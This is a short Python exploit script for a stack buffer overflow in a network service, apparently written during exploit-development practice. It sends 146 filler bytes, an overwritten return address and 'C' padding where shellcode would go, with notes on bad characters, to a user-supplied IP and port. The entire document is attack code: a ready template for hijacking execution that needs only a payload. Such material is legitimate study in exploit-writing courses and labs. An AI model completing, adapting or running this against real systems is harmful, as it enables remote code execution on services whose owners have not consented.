#!/usr/bin/env python3

import sys, socket

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

filler = 'A'*146
ret = '\xC3\x14\x04\x08'
payload = 'C'*(300-146-4)
# Badchars: \x00 \x0a 

total = filler + ret + payload + '\r\n'

try:
	print("Sending buffer..")
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect((host, port)) # Connect to user supplied port and IP address	
	client.send(total.encode('latin-1'))
	print(client.recv(1024))

except:
	print("Cannot connect!")
	sys.exit(0)

client.close()
